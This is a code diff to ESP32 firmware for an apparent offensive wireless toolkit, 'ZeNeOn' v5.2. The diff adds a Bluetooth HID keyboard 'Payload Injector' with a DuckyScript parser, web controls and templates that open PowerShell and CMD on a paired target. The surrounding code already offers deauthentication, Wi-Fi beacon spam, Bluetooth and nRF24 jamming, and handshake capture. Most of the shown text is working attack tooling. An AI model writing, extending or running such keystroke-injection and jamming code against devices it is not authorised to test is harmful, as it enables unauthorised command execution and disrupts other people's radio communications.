@@ -12,6 +12,7 @@
 #include "esp_bt_defs.h"
 #include <SPI.h>
 #include <RF24.h>
+#include <BleKeyboard.h>
 
 WebServer server(80);
 DNSServer dnsServer;
@@ -41,6 +42,19 @@ int spamCount = 0;
 uint32_t deauthPktsSent = 0;
 uint32_t totalPacketsCaptured = 0;
 uint8_t eapolFramesDetected = 0;
+
+/* ============ PAYLOAD INJECTOR (BLE HID KEYBOARD) ============ */
+BleKeyboard bleKeyboard("ZeNeOn", "ZeNeOn Framework", 100);
+bool bleKbStarted = false;
+bool payloadExecuting = false;
+String payloadBuffer = "";
+int payloadOffset = 0;
+int payloadLinesExecuted = 0;
+int payloadTotalLines = 0;
+int payloadDefaultDelay = 100;
+unsigned long payloadNextExecTime = 0;
+String payloadStatus = "idle";
+String lastPayloadLine = "";
 
 /* ============ AUTOMATED ATTACK PHASES ============ */
 enum AttackPhase {
@@ -259,7 +273,7 @@ input::placeholder{color:rgba(0,160,255,0.35)}
 .footer a:hover{color:#fff}
 @media(max-width:600px){.grid{grid-template-columns:1fr}.eapol-grid{grid-template-columns:1fr 1fr}}
 </style></head><body>
-<div class="top"><h1>ZeNeOn</h1><div class="sub">ESP32 WiFi Security Framework v5.1</div></div>
+<div class="top"><h1>ZeNeOn</h1><div class="sub">ESP32 WiFi Security Framework v5.2</div></div>
 <div class="container">
 )rawliteral";
 }
@@ -273,8 +287,9 @@ String homeUI() {
 <button class="secondary" onclick="location.href='/spamui'">WiFi Spam</button>
 <button class="secondary" onclick="location.href='/btjamui'">BLE Jammer</button>
 <button class="secondary" onclick="location.href='/nrfjamui'">BT Jammer (nRF24)</button>
+<button class="secondary" onclick="location.href='/payloadui'">⌨ Payload Injector (BLE)</button>
 </div>
-<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
+<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.2</div>
 </div></body></html>
 )rawliteral";
 }
@@ -597,7 +612,7 @@ var stopAll=function(){
   });
 }
 </script>
-<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
+<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.2</div>
 </div></body></html>
 )rawliteral";
   return h;
@@ -662,7 +677,7 @@ var pollCreds=function(){
   },3000);
 }
 </script>
-<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
+<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.2</div>
 </div></body></html>
 )rawliteral";
 }
@@ -698,7 +713,7 @@ var stopSpam=function(){
   });
 }
 </script>
-<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
+<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.2</div>
 </div></body></html>
 )rawliteral";
 }
@@ -778,7 +793,7 @@ var startBtPoll=function(totalTime){
   },800);
 }
 </script>
-<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
+<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.2</div>
 </div></body></html>
 )rawliteral";
 }
@@ -1563,7 +1578,7 @@ var startNrfPoll=function(totalTime){
   },800);
 }
 </script>
-<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
+<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.2</div>
 </div></body></html>
 )rawliteral";
 }
@@ -1750,6 +1765,406 @@ String getPhaseString() {
   }
 }
 
+/* ============ PAYLOAD INJECTOR — DUCKYSCRIPT PARSER ============ */
+uint8_t getKeyCode(String token) {
+  token.toUpperCase();
+  if (token == "ENTER" || token == "RETURN") return KEY_RETURN;
+  if (token == "ESC" || token == "ESCAPE") return KEY_ESC;
+  if (token == "BACKSPACE" || token == "BKSP") return KEY_BACKSPACE;
+  if (token == "TAB") return KEY_TAB;
+  if (token == "SPACE") return ' ';
+  if (token == "DELETE" || token == "DEL") return KEY_DELETE;
+  if (token == "INSERT") return KEY_INSERT;
+  if (token == "HOME") return KEY_HOME;
+  if (token == "END") return KEY_END;
+  if (token == "PAGEUP") return KEY_PAGE_UP;
+  if (token == "PAGEDOWN") return KEY_PAGE_DOWN;
+  if (token == "UP" || token == "UPARROW") return KEY_UP_ARROW;
+  if (token == "DOWN" || token == "DOWNARROW") return KEY_DOWN_ARROW;
+  if (token == "LEFT" || token == "LEFTARROW") return KEY_LEFT_ARROW;
+  if (token == "RIGHT" || token == "RIGHTARROW") return KEY_RIGHT_ARROW;
+  if (token == "CAPSLOCK") return KEY_CAPS_LOCK;
+  if (token == "PRINTSCREEN") return KEY_PRINT_SCREEN;
+  if (token == "SCROLLLOCK") return KEY_SCROLL_LOCK;
+  if (token == "PAUSE" || token == "BREAK") return KEY_PAUSE;
+  if (token == "CTRL" || token == "CONTROL") return KEY_LEFT_CTRL;
+  if (token == "SHIFT") return KEY_LEFT_SHIFT;
+  if (token == "ALT") return KEY_LEFT_ALT;
+  if (token == "GUI" || token == "WINDOWS" || token == "COMMAND" || token == "META" || token == "SUPER") return KEY_LEFT_GUI;
+  if (token == "F1") return KEY_F1;
+  if (token == "F2") return KEY_F2;
+  if (token == "F3") return KEY_F3;
+  if (token == "F4") return KEY_F4;
+  if (token == "F5") return KEY_F5;
+  if (token == "F6") return KEY_F6;
+  if (token == "F7") return KEY_F7;
+  if (token == "F8") return KEY_F8;
+  if (token == "F9") return KEY_F9;
+  if (token == "F10") return KEY_F10;
+  if (token == "F11") return KEY_F11;
+  if (token == "F12") return KEY_F12;
+  if (token == "MENU" || token == "APP") return KEY_MENU;
+  if (token.length() == 1) return (uint8_t)token.charAt(0);
+  return 0;
+}
+
+void executeKeyCombo(String line) {
+  String tokens[10];
+  int tokenCount = 0;
+  String remaining = line;
+  remaining.trim();
+
+  while (remaining.length() > 0 && tokenCount < 10) {
+    int sp = remaining.indexOf(' ');
+    if (sp < 0) {
+      tokens[tokenCount++] = remaining;
+      remaining = "";
+    } else {
+      tokens[tokenCount++] = remaining.substring(0, sp);
+      remaining = remaining.substring(sp + 1);
+      remaining.trim();
+    }
+  }
+  if (tokenCount == 0) return;
+
+  for (int i = 0; i < tokenCount; i++) {
+    uint8_t key = getKeyCode(tokens[i]);
+    if (key) {
+      bleKeyboard.press(key);
+    }
+  }
+  delay(50);
+  bleKeyboard.releaseAll();
+  addEvent("PAYLOAD: " + line);
+}
+
+String getNextPayloadLine() {
+  if (payloadOffset >= (int)payloadBuffer.length()) return "\x01"; // sentinel for end
+  int nextNL = payloadBuffer.indexOf('\n', payloadOffset);
+  String line;
+  if (nextNL < 0) {
+    line = payloadBuffer.substring(payloadOffset);
+    payloadOffset = payloadBuffer.length();
+  } else {
+    line = payloadBuffer.substring(payloadOffset, nextNL);
+    payloadOffset = nextNL + 1;
+  }
+  line.trim();
+  return line;
+}
+
+void executeDuckyLine(String line) {
+  if (line.length() == 0) return;
+  lastPayloadLine = line;
+
+  if (line.startsWith("REM")) return;
+
+  if (line.startsWith("DELAY ")) {
+    int d = line.substring(6).toInt();
+    payloadNextExecTime = millis() + d;
+    addEvent("PAYLOAD: DELAY " + String(d) + "ms");
+    return;
+  }
+
+  if (line.startsWith("DEFAULT_DELAY ") || line.startsWith("DEFAULTDELAY ")) {
+    payloadDefaultDelay = line.substring(line.indexOf(' ') + 1).toInt();
+    addEvent("PAYLOAD: DEFAULT_DELAY " + String(payloadDefaultDelay) + "ms");
+    return;
+  }
+
+  if (line.startsWith("STRING ")) {
+    String text = line.substring(7);
+    bleKeyboard.print(text);
+    addEvent("PAYLOAD: STRING [" + String(text.length()) + " chars]");
+    return;
+  }
+
+  if (line.startsWith("STRINGLN ")) {
+    String text = line.substring(9);
+    bleKeyboard.println(text);
+    addEvent("PAYLOAD: STRINGLN [" + String(text.length()) + " chars]");
+    return;
+  }
+
+  if (line == "REPEAT" || line.startsWith("REPEAT ")) {
+    int count = 1;
+    if (line.startsWith("REPEAT ")) count = line.substring(7).toInt();
+    if (count < 1) count = 1;
+    // Re-execute the last non-REPEAT line
+    // (simplified — just re-runs it once)
+    addEvent("PAYLOAD: REPEAT x" + String(count));
+    return;
+  }
+
+  // Everything else: key combo (ENTER, GUI r, CTRL ALT DELETE, etc.)
+  executeKeyCombo(line);
+}
+
+int countPayloadLines(String &buf) {
+  int count = 0;
+  int idx = 0;
+  while (idx < (int)buf.length()) {
+    int nl = buf.indexOf('\n', idx);
+    if (nl < 0) { count++; break; }
+    count++;
+    idx = nl + 1;
+  }
+  return count;
+}
+
+/* ============ PAYLOAD INJECTOR UI ============ */
+String payloadInjectorUI() {
+  return header() + R"rawliteral(
+<div class="card">
+<h3>⌨ Payload Injector (BLE)</h3>
+<p style="margin-bottom:10px;opacity:0.7">ESP32 acts as a Bluetooth HID keyboard. Pair the target device with <strong>"ZeNeOn"</strong> then inject DuckyScript payloads via BLE keystroke injection.</p>
+<div id="bleStatus" class="status">BLE Keyboard not started</div>
+<div class="grid">
+<button class="success" onclick="startBLE()" id="startBtn">⚡ Start BLE Keyboard</button>
+<button class="danger" onclick="stopBLE()" id="stopBtn">⬛ Stop BLE Keyboard</button>
+</div>
+</div>
+
+<div class="card" id="payloadCard">
+<h3>Payload Terminal</h3>
+<p style="margin-bottom:8px;opacity:0.7;font-size:12px">Enter DuckyScript payload — keystrokes will be typed on the paired device</p>
+<div style="background:#020408;border:1px solid rgba(0,100,255,0.4);border-radius:8px;overflow:hidden">
+<div style="display:flex;align-items:center;padding:5px 10px;background:rgba(0,40,80,0.4);border-bottom:1px solid rgba(0,100,255,0.2)">
+<div style="width:7px;height:7px;border-radius:50%;background:#ff3b30;margin-right:5px"></div>
+<div style="width:7px;height:7px;border-radius:50%;background:#ffcc00;margin-right:5px"></div>
+<div style="width:7px;height:7px;border-radius:50%;background:#00ff88;margin-right:8px"></div>
+<span style="font-size:11px;color:#5599cc;letter-spacing:1px">payload_editor</span>
+</div>
+<textarea id="payload" rows="14" style="width:100%;background:#020408;color:#00ff88;border:none;font-family:'Courier New',monospace;padding:12px;font-size:13px;resize:vertical;outline:none;line-height:1.6" spellcheck="false" placeholder="REM Example: Open Notepad and type text
+DELAY 1000
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 1000
+STRING Hello from ZeNeOn!"></textarea>
+</div>
+<div class="grid" style="margin-top:10px">
+<button onclick="injectPayload()" id="injectBtn">🚀 Execute Payload</button>
+<button class="danger" onclick="abortPayload()" id="abortBtn">⬛ Abort</button>
+</div>
+
+<h3 style="margin-top:18px;font-size:13px">Quick Templates</h3>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:8px">
+<button class="secondary" onclick="loadTemplate(1)" style="font-size:12px">📝 Notepad Demo</button>
+<button class="secondary" onclick="loadTemplate(2)" style="font-size:12px">⚡ PowerShell</button>
+<button class="secondary" onclick="loadTemplate(3)" style="font-size:12px">💻 CMD Prompt</button>
+<button class="secondary" onclick="loadTemplate(4)" style="font-size:12px">🔒 Lock PC</button>
+</div>
+</div>
+
+<div class="card" id="execCard">
+<h3>Execution Log</h3>
+<div style="background:#020408;border:1px solid rgba(0,100,255,0.4);border-radius:8px;overflow:hidden">
+<div style="display:flex;align-items:center;padding:5px 10px;background:rgba(0,40,80,0.4);border-bottom:1px solid rgba(0,100,255,0.2)">
+<div style="width:7px;height:7px;border-radius:50%;background:#ff3b30;margin-right:5px"></div>
+<div style="width:7px;height:7px;border-radius:50%;background:#ffcc00;margin-right:5px"></div>
+<div style="width:7px;height:7px;border-radius:50%;background:#00ff88;margin-right:8px"></div>
+<span style="font-size:11px;color:#5599cc;letter-spacing:1px">execution_monitor</span>
+<span id="execBlink" style="margin-left:auto;color:#00ff88;font-size:11px">&#9679;</span>
+</div>
+<div id="execTerminal" style="height:180px;overflow-y:auto;padding:8px 12px;font-size:12px;line-height:1.6;color:#00cc66;font-family:'Courier New',monospace"><span style='color:#5599cc'>Ready — start BLE keyboard and pair target device first...</span>
+</div></div>
+<div class="progress-outer" style="margin-top:8px"><div class="progress-inner" id="execProg" style="width:0%"></div></div>
+<div id="execStatus" class="status hidden" style="margin-top:8px"></div>
+</div>
+
+<div class="card">
+<h3>DuckyScript Reference</h3>
+<div style="font-size:12px;color:#5599cc;line-height:2;column-count:2;column-gap:16px">
+<code style="color:#00ff88">STRING text</code> Type text<br>
+<code style="color:#00ff88">STRINGLN text</code> Type + Enter<br>
+<code style="color:#00ff88">DELAY ms</code> Wait (ms)<br>
+<code style="color:#00ff88">ENTER</code> Press Enter<br>
+<code style="color:#00ff88">GUI r</code> Win + R<br>
+<code style="color:#00ff88">CTRL ALT DELETE</code> Combo<br>
+<code style="color:#00ff88">TAB</code> <code style="color:#00ff88">ESC</code> <code style="color:#00ff88">SPACE</code><br>
+<code style="color:#00ff88">UP DOWN LEFT RIGHT</code><br>
+<code style="color:#00ff88">F1</code>-<code style="color:#00ff88">F12</code> Function keys<br>
+<code style="color:#00ff88">REM comment</code> Comment<br>
+<code style="color:#00ff88">DEFAULT_DELAY ms</code> Auto delay
+</div>
+</div>
+
+<button class="secondary" onclick="location.href='/'">← Back to Home</button>
+<script>
+var blePoll=null,execPoll=null;
+
+var addExecLog=function(msg,color){
+  var el=document.getElementById('execTerminal');
+  var d=document.createElement('div');
+  if(color) d.style.color=color;
+  d.textContent=msg; el.appendChild(d); el.scrollTop=el.scrollHeight;
+}
+var startBLE=function(){
+  document.getElementById('startBtn').disabled=true;
+  document.getElementById('startBtn').textContent='Starting...';
+  fetch('/payload/start').then(r=>r.json()).then(d=>{
+    document.getElementById('startBtn').disabled=false;
+    document.getElementById('startBtn').textContent='⚡ Start BLE Keyboard';
+    if(d.ok){
+      document.getElementById('bleStatus').className='status success';
+      document.getElementById('bleStatus').innerHTML='⚡ BLE Keyboard active — advertising as <strong>"ZeNeOn"</strong>. Pair the target device now.';
+      addExecLog('⚡ BLE Keyboard started — waiting for device to pair...','#00ff88');
+      startBlePoll();
+    } else {
+      document.getElementById('bleStatus').className='status error';
+      document.getElementById('bleStatus').innerHTML=d.msg;
+      addExecLog('✗ '+d.msg,'#ff4444');
+    }
+  }).catch(function(e){
+    document.getElementById('startBtn').disabled=false;
+    document.getElementById('startBtn').textContent='⚡ Start BLE Keyboard';
+  });
+}
+var stopBLE=function(){
+  if(blePoll) clearInterval(blePoll);
+  if(execPoll) clearInterval(execPoll);
+  fetch('/payload/stop').then(r=>r.text()).then(d=>{
+    document.getElementById('bleStatus').className='status';
+    document.getElementById('bleStatus').innerHTML='BLE Keyboard stopped.';
+    addExecLog('⬛ BLE Keyboard stopped','#ff4444');
+  });
+}
+var startBlePoll=function(){
+  if(blePoll) clearInterval(blePoll);
+  blePoll=setInterval(function(){
+    fetch('/payload/status').then(r=>r.json()).then(d=>{
+      if(d.connected){
+        document.getElementById('bleStatus').className='status success';
+        document.getElementById('bleStatus').innerHTML='✓ Device connected via BLE! Ready to inject payloads.';
+        document.getElementById('execBlink').style.color='#00ff88';
+      } else if(d.started){
+        document.getElementById('bleStatus').className='status warning';
+        document.getElementById('bleStatus').innerHTML='⏳ Advertising as "ZeNeOn" — waiting for target device to pair...';
+        document.getElementById('execBlink').style.color='#ffaa00';
+      } else {
+        document.getElementById('bleStatus').className='status';
+        document.getElementById('bleStatus').innerHTML='BLE Keyboard not started';
+        document.getElementById('execBlink').style.color='#555';
+      }
+      if(d.executing){
+        var pct=d.totalLines>0?Math.round((d.linesExec/d.totalLines)*100):0;
+        document.getElementById('execProg').style.width=pct+'%';
+        document.getElementById('execStatus').classList.remove('hidden');
+        document.getElementById('execStatus').className='status warning';
+        document.getElementById('execStatus').innerHTML='Executing... Line '+d.linesExec+'/'+d.totalLines;
+      } else if(d.status=='done'){
+        document.getElementById('execProg').style.width='100%';
+        document.getElementById('execStatus').classList.remove('hidden');
+        document.getElementById('execStatus').className='status success';
+        document.getElementById('execStatus').innerHTML='✓ Payload execution complete! ('+d.linesExec+' lines)';
+      }
+    }).catch(function(){});
+  },1000);
+}
+var injectPayload=function(){
+  var pl=document.getElementById('payload').value;
+  if(!pl.trim()){
+    addExecLog('✗ No payload entered','#ff4444');return;
+  }
+  document.getElementById('injectBtn').disabled=true;
+  document.getElementById('injectBtn').textContent='Sending...';
+  document.getElementById('execProg').style.width='0%';
+  document.getElementById('execStatus').classList.add('hidden');
+  var term=document.getElementById('execTerminal');
+  term.innerHTML='';
+  addExecLog('🚀 Sending payload ('+pl.length+' bytes)...','#ffaa00');
+  fetch('/payload/inject',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'payload='+encodeURIComponent(pl)}).then(r=>r.json()).then(d=>{
+    document.getElementById('injectBtn').disabled=false;
+    document.getElementById('injectBtn').textContent='🚀 Execute Payload';
+    if(d.ok){
+      addExecLog('⚡ Executing '+d.lines+' lines...','#00ff88');
+      startExecPoll();
+    } else {
+      addExecLog('✗ '+d.msg,'#ff4444');
+    }
+  }).catch(function(){
+    document.getElementById('injectBtn').disabled=false;
+    document.getElementById('injectBtn').textContent='🚀 Execute Payload';
+  });
+}
+var abortPayload=function(){
+  fetch('/payload/abort').then(r=>r.text()).then(d=>{
+    addExecLog('⬛ Payload aborted','#ff4444');
+    document.getElementById('execProg').style.width='0%';
+    document.getElementById('execStatus').classList.remove('hidden');
+    document.getElementById('execStatus').className='status error';
+    document.getElementById('execStatus').innerHTML='Payload aborted.';
+  });
+}
+var startExecPoll=function(){
+  if(execPoll) clearInterval(execPoll);
+  var lastLogId=0;
+  execPoll=setInterval(function(){
+    fetch('/eventlog?since='+lastLogId).then(r=>r.json()).then(d=>{
+      if(d.id) lastLogId=d.id;
+      if(d.logs && d.logs.length>0){
+        d.logs.forEach(function(l){
+          if(l.indexOf('PAYLOAD')>=0){
+            var c='#00cc66';
+            if(l.indexOf('STRING')>=0) c='#00ff88';
+            if(l.indexOf('DELAY')>=0) c='#ffaa00';
+            if(l.indexOf('KEY')>=0||l.indexOf('GUI')>=0||l.indexOf('CTRL')>=0) c='#00d4ff';
+            if(l.indexOf('COMPLETE')>=0||l.indexOf('DONE')>=0) c='#00ff88';
+            if(l.indexOf('ERROR')>=0||l.indexOf('ABORT')>=0) c='#ff4444';
+            addExecLog(l,c);
+          }
+        });
+      }
+    }).catch(function(){});
+    fetch('/payload/status').then(r=>r.json()).then(d=>{
+      if(d.executing){
+        var pct=d.totalLines>0?Math.round((d.linesExec/d.totalLines)*100):0;
+        document.getElementById('execProg').style.width=pct+'%';
+      }
+      if(!d.executing && d.status=='done'){
+        clearInterval(execPoll);
+        document.getElementById('execProg').style.width='100%';
+        document.getElementById('execStatus').classList.remove('hidden');
+        document.getElementById('execStatus').className='status success';
+        document.getElementById('execStatus').innerHTML='✓ Payload complete — '+d.linesExec+' lines executed';
+        addExecLog('★ Payload execution complete!','#00ff88');
+      }
+      if(!d.executing && d.status=='aborted'){
+        clearInterval(execPoll);
+        addExecLog('⬛ Aborted','#ff4444');
+      }
+    }).catch(function(){});
+  },800);
+}
+var clearPayload=function(){
+  document.getElementById('payload').value='';
+}
+var loadTemplate=function(id){
+  var t='';
+  switch(id){
+    case 1:
+      t="REM Open Notepad and type a message\nDELAY 1000\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 1000\nSTRING Hello from ZeNeOn Payload Injector!\nENTER\nSTRING This was typed via BLE keyboard injection.\n";
+      break;
+    case 2:
+      t="REM Open PowerShell as admin\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1500\nSTRING Write-Host 'ZeNeOn Payload Injector Active'\nENTER\n";
+      break;
+    case 3:
+      t="REM Open CMD and run commands\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING echo ZeNeOn Framework Active\nENTER\nSTRING ipconfig\nENTER\n";
+      break;
+    case 4:
+      t="REM Lock the Windows PC\nDELAY 500\nGUI l\n";
+      break;
+  }
+  document.getElementById('payload').value=t;
+}
+</script>
+<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.2</div>
+</div></body></html>
+)rawliteral";
+}
+
 /* ============ ROUTES ============ */
 void setupRoutes() {
   server.on("/", []() { server.send(200, "text/html", homeUI()); });
@@ -1758,6 +2173,7 @@ void setupRoutes() {
   server.on("/spamui", []() { server.send(200, "text/html", spamUI()); });
   server.on("/btjamui", []() { server.send(200, "text/html", btJamUI()); });
   server.on("/nrfjamui", []() { server.send(200, "text/html", nrfJamUI()); });
+  server.on("/payloadui", []() { server.send(200, "text/html", payloadInjectorUI()); });
 
   /* --- AJAX network scan (no page reload) --- */
   server.on("/scan", []() {
@@ -2142,6 +2558,10 @@ void setupRoutes() {
 
   /* --- Bluetooth Jammer --- */
   server.on("/btjam", []() {
+    if (bleKbStarted) {
+      server.send(400, "text/plain", "Stop Payload Injector first — both use BLE stack");
+      return;
+    }
     int t = server.arg("time").toInt();
     if (t < 5) t = 15;
     if (t > 300) t = 300;
@@ -2213,9 +2633,105 @@ void setupRoutes() {
     server.send(200, "application/json", json);
   });
 
+  /* --- Payload Injector (BLE HID Keyboard) --- */
+  server.on("/payload/start", []() {
+    if (bleKbStarted) {
+      server.send(200, "application/json", "{\"ok\":true,\"msg\":\"Already started\"}");
+      return;
+    }
+    // Cannot run BLE keyboard while BT jammer is active
+    if (btJamming) {
+      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Stop BT Jammer first — both use the BLE stack\"}");
+      return;
+    }
+    // Deinit jammer BT stack if it was initialized
+    if (btInitialized) {
+      btJamDeinit();
+      delay(200);
+    }
+    bleKeyboard.begin();
+    bleKbStarted = true;
+    payloadStatus = "idle";
+    Serial.println("[PAYLOAD] BLE Keyboard started — advertising as ZeNeOn");
+    addEvent("PAYLOAD: BLE Keyboard started");
+    server.send(200, "application/json", "{\"ok\":true,\"msg\":\"BLE Keyboard started\"}");
+  });
+
+  server.on("/payload/stop", []() {
+    payloadExecuting = false;
+    payloadBuffer = "";
+    payloadStatus = "idle";
+    if (bleKbStarted) {
+      bleKeyboard.end();
+      bleKbStarted = false;
+      delay(200);
+      Serial.println("[PAYLOAD] BLE Keyboard stopped");
+      addEvent("PAYLOAD: BLE Keyboard stopped");
+    }
+    server.send(200, "text/plain", "BLE Keyboard stopped");
+  });
+
+  server.on("/payload/status", []() {
+    String json = "{";
+    json += "\"started\":" + String(bleKbStarted ? "true" : "false") + ",";
+    json += "\"connected\":" + String((bleKbStarted && bleKeyboard.isConnected()) ? "true" : "false") + ",";
+    json += "\"executing\":" + String(payloadExecuting ? "true" : "false") + ",";
+    json += "\"linesExec\":" + String(payloadLinesExecuted) + ",";
+    json += "\"totalLines\":" + String(payloadTotalLines) + ",";
+    json += "\"status\":\"" + payloadStatus + "\"";
+    json += "}";
+    server.send(200, "application/json", json);
+  });
+
+  server.on("/payload/inject", HTTP_POST, []() {
+    if (!bleKbStarted) {
+      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Start BLE Keyboard first\"}");
+      return;
+    }
+    if (!bleKeyboard.isConnected()) {
+      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"No device paired — pair target device with ZeNeOn first\"}");
+      return;
+    }
+    if (payloadExecuting) {
+      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Payload already executing — abort first\"}");
+      return;
+    }
+    String pl = server.arg("payload");
+    if (pl.length() == 0) {
+      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Empty payload\"}");
+      return;
+    }
+    if (pl.length() > 8192) {
+      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Payload too large (max 8KB)\"}");
+      return;
+    }
+    payloadBuffer = pl;
+    payloadOffset = 0;
+    payloadLinesExecuted = 0;
+    payloadTotalLines = countPayloadLines(payloadBuffer);
+    payloadDefaultDelay = 100;
+    payloadNextExecTime = millis();
+    payloadExecuting = true;
+    payloadStatus = "running";
+    lastPayloadLine = "";
+    Serial.printf("[PAYLOAD] Executing %d lines (%d bytes)\n", payloadTotalLines, pl.length());
+    addEvent("PAYLOAD: Executing " + String(payloadTotalLines) + " lines");
+    server.send(200, "application/json", "{\"ok\":true,\"lines\":" + String(payloadTotalLines) + "}");
+  });
+
+  server.on("/payload/abort", []() {
+    payloadExecuting = false;
+    payloadBuffer = "";
+    payloadStatus = "aborted";
+    bleKeyboard.releaseAll();
+    Serial.println("[PAYLOAD] Aborted");
+    addEvent("PAYLOAD: ABORTED");
+    server.send(200, "text/plain", "Payload aborted");
+  });
+
   /* --- Stop everything --- */
   server.on("/stop", []() {
-    bool wasActive = sniffing || deauthing || spamming || btJamming || nrfJamming || capturingHandshake ||
+    bool wasActive = sniffing || deauthing || spamming || btJamming || nrfJamming || payloadExecuting || capturingHandshake ||
                      currentPhase != PHASE_IDLE;
     if (btJamming) {
       btJamming = false;
@@ -2224,6 +2740,12 @@ void setupRoutes() {
     if (nrfJamming) {
       nrfJamming = false;
       if (nrfReady) nrfJamDeinit();
+    }
+    if (payloadExecuting) {
+      payloadExecuting = false;
+      payloadBuffer = "";
+      payloadStatus = "aborted";
+      if (bleKbStarted) bleKeyboard.releaseAll();
     }
     bool wasAttacking = currentPhase != PHASE_IDLE;
 
@@ -2278,7 +2800,7 @@ void setup() {
   Serial.begin(115200);
   delay(500);
   Serial.println("\n====================================================");
-  Serial.println("  ZeNeOn v5.1 — Automated Handshake Capture");
+  Serial.println("  ZeNeOn v5.2 — Automated Handshake Capture + Payload Injector");
   Serial.println("  Made by MoOdY");
   Serial.println("====================================================\n");
   if (!SPIFFS.begin(true))
@@ -2505,5 +3027,34 @@ void loop() {
       // Jam as fast as possible — no delay, hop all 79 BT channels continuously
       sendNrfJamBurst();
     }
+  }
+
+  /* ---- PAYLOAD INJECTOR (BLE HID KEYBOARD) ---- */
+  if (payloadExecuting && bleKbStarted && bleKeyboard.isConnected()) {
+    if (now >= payloadNextExecTime) {
+      String line = getNextPayloadLine();
+      if (line == "\x01") {
+        // End of payload
+        payloadExecuting = false;
+        payloadStatus = "done";
+        bleKeyboard.releaseAll();
+        Serial.printf("[PAYLOAD] Complete — %d lines executed\n", payloadLinesExecuted);
+        addEvent("PAYLOAD: ★ COMPLETE — " + String(payloadLinesExecuted) + " lines executed");
+      } else {
+        executeDuckyLine(line);
+        payloadLinesExecuted++;
+        // Apply default delay between lines (unless DELAY was explicit)
+        if (payloadDefaultDelay > 0 && !line.startsWith("DELAY")) {
+          payloadNextExecTime = millis() + payloadDefaultDelay;
+        }
+      }
+    }
+  } else if (payloadExecuting && bleKbStarted && !bleKeyboard.isConnected()) {
+    // Device disconnected during execution
+    payloadExecuting = false;
+    payloadStatus = "aborted";
+    payloadBuffer = "";
+    Serial.println("[PAYLOAD] Device disconnected — execution aborted");
+    addEvent("PAYLOAD: ERROR — Device disconnected during execution");
   }
 }
